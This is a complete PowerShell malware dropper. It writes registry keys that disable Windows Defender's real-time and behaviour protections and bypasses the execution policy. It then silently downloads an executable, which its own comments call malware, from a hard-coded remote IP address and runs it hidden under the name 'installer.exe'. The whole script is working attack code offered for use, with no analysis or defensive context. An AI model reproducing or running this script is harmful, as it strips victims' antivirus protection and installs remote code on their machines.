# Function to disable Windows Defender
function Disable-WindowsDefender {
    $regContent = @"
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
"DisableAntiSpyware"=dword:00000001
"DisableRealtimeMonitoring"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
"DisableBehaviorMonitoring"=dword:00000001
"DisableOnAccessProtection"=dword:00000001
"DisableScanOnRealtimeEnable"=dword:00000001
"@

    $regFilePath = "$env:TEMP\disable_defender.reg"
    $regContent | Out-File -FilePath $regFilePath -Encoding ASCII
    try {
        Start-Process regedit.exe -ArgumentList "/s $regFilePath" -Wait -ErrorAction Stop
        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Windows Defender disabled successfully." -ErrorAction SilentlyContinue
    } catch {
        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to disable Windows Defender: $_" -ErrorAction SilentlyContinue
    }
}

# Function to download a file silently
function Download-File {
    param (
        [string]$url,
        [string]$outputPath
    )

    try {
        Invoke-WebRequest -Uri $url -OutFile $outputPath -UseBasicParsing
        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Downloaded file from $url to $outputPath" -ErrorAction SilentlyContinue
    } catch {
        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to download: $url" -ErrorAction SilentlyContinue
    }
}

# Function to run an executable silently
function Run-Executable {
    param (
        [string]$filePath
    )

    try {
        $process = Start-Process -FilePath $filePath -NoNewWindow -PassThru -Wait -WindowStyle Hidden
        if ($process) {
            $process.WaitForExit()
            if ($process.ExitCode -ne 0) {
                Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to execute: $filePath. Exit code: $($process.ExitCode)" -ErrorAction SilentlyContinue
            } else {
                Add-Content -Path "$env:TEMP\script_log.txt" -Value "Executed $filePath successfully." -ErrorAction SilentlyContinue
            }
        } else {
            Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to start process: $filePath" -ErrorAction SilentlyContinue
        }
    } catch {
        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Exception occurred while executing $filePath: $_" -ErrorAction SilentlyContinue
    }
}

# Set execution policy to bypass for the current session
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# URL of the malware file (replace with your actual URL)
$malwareUrl = "http://54.224.34.222:3004/uploads/BootyMistress.exe"

# Path to download the file
$downloadPath = "$env:TEMP\installer.exe"

# Ensure Windows Defender is disabled before downloading and executing the malware
Disable-WindowsDefender

# Download and run the malware file
Download-File -url $malwareUrl -outputPath $downloadPath
Run-Executable -filePath $downloadPath

# Display completion message
Write-Output "Script execution completed."
